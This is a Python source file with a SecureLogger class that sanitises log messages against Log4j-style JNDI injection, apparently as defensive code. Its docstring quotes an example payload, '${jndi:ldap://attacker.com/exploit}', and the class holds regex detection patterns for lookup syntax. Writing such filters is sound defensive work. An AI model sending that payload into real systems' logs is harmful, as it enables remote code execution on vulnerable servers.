import re
import logging

class SecureLogger:
    """
    A secure logging framework that prevents Log4j-style JNDI injection attacks.
    JNDI injection vulnerabilities allow attackers to execute remote code via
    malicious lookup patterns like ${jndi:ldap://attacker.com/exploit}
    """
    
    # Pattern to detect JNDI lookup syntax: ${jndi:...}
    JNDI_PATTERN = re.compile(r'\$\{jndi:([^}]+)\}', re.IGNORECASE)
    # Pattern to detect other dangerous lookup patterns
    LOOKUP_PATTERN = re.compile(r'\$\{([^}]+)\}', re.IGNORECASE)
    
    def __init__(self, name="secure_logger"):
        self.logger = logging.getLogger(name)
        if not self.logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            self.logger.addHandler(handler)
    
    def _sanitize(self, message):
        """
        Sanitize log messages to prevent JNDI injection.
        Replaces dangerous JNDI lookup patterns with safe literals.
        """
        if not isinstance(message, str):
            message = str(message)
        
        # Block JNDI lookups specifically
        sanitized = self.JNDI_PATTERN.sub('[BLOCKED_JNDI]', message)
        # Also neutralize other lookup patterns as defense in depth
        sanitized = self.LOOKUP_PATTERN.sub(r'[\1]', sanitized)
        return sanitized
    
    def info(self, message):
        self.logger.info(self._sanitize(message))
    
    def warning(self, message):
        self.logger.warning(self._sanitize(message))
    
    def error(self, message):
        self.logger.error(self._sanitize(message))
    
    def debug(self, message):
        self.logger.debug(self._sanitize(message))
    
    def critical(self, message):
        self.logger.critical(self._sanitize(message))